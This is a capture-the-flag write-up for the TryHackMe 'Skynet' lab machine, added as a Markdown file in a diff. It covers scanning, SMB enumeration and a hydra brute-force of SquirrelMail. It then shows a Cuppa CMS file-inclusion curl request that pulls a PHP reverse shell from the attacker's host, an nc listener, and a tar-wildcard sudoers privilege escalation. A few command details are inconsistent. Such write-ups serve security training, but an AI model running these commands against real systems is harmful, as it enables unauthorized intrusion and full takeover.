@@ -1,0 +1,151 @@
+# Skynet CTF
+
+---
+
+## Link: https://tryhackme.com/room/skynet
+
+--- 
+
+
+Nmap scan:
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 992331bbb1e943b756944cb9e82146c5 (RSA)
+|   256 57c07502712d193183dbe4fe679668cf (ECDSA)
+|_  256 46fa4efc10a54f5757d06d54f6c34dfe (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Skynet
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: TOP RESP-CODES SASL AUTH-RESP-CODE UIDL PIPELINING CAPA
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+143/tcp open  imap        Dovecot imapd
+|_imap-capabilities: IMAP4rev1 listed Pre-login LOGINDISABLEDA0001 IDLE SASL-IR more have post-login LITERAL+ ENABLE OK capabilities LOGIN-REFERRALS ID
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -5h59m06s, deviation: 3h27m51s, median: -7h59m07s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2023-12-28T08:22:08
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: skynet
+|   NetBIOS computer name: SKYNET\x00
+|   Domain name: \x00
+|   FQDN: skynet
+|_  System time: 2023-12-28T02:22:08-06
+
+
+
+#SMB
+
+SMB enumeration says that we are allowed to enter the anonymous directory, we can see there are 2 important files 
+
+- Log1.txt
+- Attention.txt
+
+Log 1 contains a big list of credentials and Attention.txt is a message for all "Skynet" employees that there has been a system error with the passwords and all the staff should change the passwords immediately
+
+---
+
+# Web server
+
+The webserver was running on port 80 and the homepage was a non responsive site for the aforementioned "Skynet" employees. There was a search engine but like I said was unresponsive 
+
+Any interaction with the site at all was met with nothing, so to find out more I used 
+
+	gobuster dir -u http://<machine_ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html
+
+Gobuster returns a couple useful webpages but we get all 403 responses which means we don't have access to the webpage.
+
+Only until later on in the scan we are able to discover the "/squirrelmail/" directory.
+
+Recalling back to the SMB enumeration, we were able to find another share called "milesdyson".
+We now also have a big list of passwords, so I decided to try brute force the squirrelmail login page to see if we can see miles' emails.
+
+I decided to brute force with hydra, here is the command
+
+	hydra -l milesdyson -P log1.txt <machine_ip> http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect" -t 20
+
+
+We find that the pasword is cyborg007haloterminator
+
+Following this we can log into miles's smb share and we find a hidden directory mentioned called /45kra24zxs28v3yd. We brute force this for directories and we find /administrator. This is running "Cuppa CMS" and after a bit of research we find Cuppa CMS allows for completely unauthenticated LFI. You can read more here: https://www.exploit-db.com/exploits/25971
+
+We use the "/alerts/alertConfigField.php?urlConfig=[FILE HERE]" to connect to our own machine.
+
+We can do this by starting a python webserver running a directory that has a PHP reverse shell file. You can find one here https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
+	python3 -m http.server
+
+So the URL should look something like this
+
+	/alerts/alertConfigField.php?urlConfig=http://<your_tryhackme_VPN_IP>/php-reverse-shell.php
+
+But wait, we dont access this directly, there is something in place to protect this kind of thing happening, we dont know where the PHP file is once we download it using the python3 webserver.  So we have to do a work around and use this syntax instead
+
+First, set up on the listener on the port you have used in the PHP reverse shell. 
+
+	rlwrap nc -lvnp <port>
+
+Then start your python webserver
+
+	python3 -m  http.server
+
+Then use this curl command
+
+	curl http://<machine_IP>/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<your_tryhackme_VPN_IP/php-reverse-shell.php>
+
+Once you run the curl command, when you check on the listener you opened up on whatever port you specified, you should have a shell on the target machine, which in a less technical wording, you have remote access to the target machine, as if you were right in front of the computer typing away.
+
+### PrivEsc
+
+We are not done yet, we don't want just basic access, we want full control, to completely take over this machine, to do that we must gain access to the computer as the user "root". This is the linux version of Admin or Administrator on Windows
+
+We can look around for way we can abuse files that might be owned by root and exploit them in a way, we find that in /home/miles/backups there is a file called backup.sh
+
+This file calls for tar, and the file is also owned by root, we can exploit this and 
+elevate our privileges to root by running these commands
+
+	echo ' username ALL=(ALL)   ALL' >> /etc/sudoers
+
+Then,
+
+	echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
+
+And finally, 
+
+	echo "/var/www/html"  > --checkpoint=1
+
+After running these commands, we can run a command of 
+
+	sudo -l
+
+This allows us to see what we can run as the root user, or better known as the super user.
+
+Before running these commands it would have prompted you to enter a password, and even if the knew the password, we would be able to run nothing as root, but running the commands I just mentioned we are able to run sudo -l now and it says we can run everything as root without a password, this if because of the "echo ' www-data ALL=(ALL)   ALL' >> /etc/sudoers".
+
+To now become root, we can just run
+
+	sudo su
+
+or 
+
+	sudo su root
+
+Now you can check out the /root directory for the final flag.
+
+Hope this helps!
